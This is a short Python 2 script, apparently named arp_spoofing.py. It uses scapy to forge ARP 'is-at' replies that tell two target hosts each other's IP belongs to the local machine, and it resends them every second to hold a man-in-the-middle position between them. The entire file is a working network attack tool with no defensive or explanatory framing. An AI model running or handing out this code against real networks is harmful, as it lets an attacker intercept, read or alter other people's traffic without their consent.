import sys
import scapy.all
import time
import socket
import fcntl
import struct
from uuid import getnode as get_mac

if len(sys.argv) < 5:
	print "++Usage: python arp_spoofing.py [ip_target1] [mac_target1] [ip_target2] [mac_target2]"
	exit(0)

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

local_ip = get_ip_address('eth0')
mac = hex(get_mac())
local_mac = ""
for i in range(2, 14, 2):
	local_mac += mac[i:i+2]
	if i < 12 :
		local_mac += ":"

ip_target1 = sys.argv[1]
mac_target1 = sys.argv[2]
ip_target2 = sys.argv[3]
mac_target2 = sys.argv[4]

arppkt_1 = (scapy.all.Ether()/scapy.all.ARP())
arppkt_1.src = local_mac 
arppkt_1.dst = mac_target1 
arppkt_1.hwdst = mac_target1
arppkt_1.pdst = ip_target1
arppkt_1.hwsrc = local_mac
arppkt_1.psrc = ip_target2
arppkt_1.op = 'is-at'

arppkt_2 = (scapy.all.Ether()/scapy.all.ARP())
arppkt_2.src = local_mac
arppkt_2.dst = mac_target2
arppkt_2.hwdst = mac_target2
arppkt_2.pdst = ip_target2
arppkt_2.hwsrc = local_mac
arppkt_2.psrc = ip_target1
arppkt_2.op = 'is-at'

print local_ip
print local_mac
arppkt_1.show()
arppkt_2.show()
while True:
	scapy.all.sendp(arppkt_1)
	arppkt_1
	scapy.all.sendp(arppkt_2)
	arppkt_2
	time.sleep(1)
